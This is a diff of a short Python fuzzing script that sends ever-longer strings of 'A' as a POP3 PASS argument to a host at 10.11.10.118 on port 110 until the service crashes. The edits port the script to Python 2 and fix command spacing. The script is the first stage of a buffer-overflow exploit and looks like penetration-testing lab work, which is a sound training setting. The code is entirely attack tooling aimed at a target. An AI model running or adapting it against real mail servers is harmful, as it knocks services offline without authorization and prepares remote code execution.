@@ -1,14 +1,14 @@
-#!/usr/bin/python3
+#!/usr/bin/python
 
 import socket
 import sys
 
-TARGET = "xxxxxxxx"
+TARGET = "10.11.10.118"
 PORT = 110
 
 buffer = "A" * 100
 
-send = lambda s,cmd,payload : s.send((cmd + payload + '\r\n').encode())
+send = lambda s,cmd,payload : s.send((cmd + payload + '\r\n'))
 
 while True:
     try:
@@ -18,13 +18,13 @@ while True:
         s.recv(1024)
         send(s, 'USER', 'test')
         s.recv(1024)
-        send(s, 'PASS', buffer)
+        send(s, 'PASS ', buffer)
         s.recv(1024)
-        send(s, 'QUIT', '')
+        send(s, 'QUIT', ' ')
         s.close()
         buffer = buffer + "A" * 100
         print(len(buffer))
     except Exception as e:
         print(e)
-        print(f"Fuzzing crashed at: {len(buffer)}")
+        print("Fuzzing crashed at: {}".format(len(buffer)))
         sys.exit()
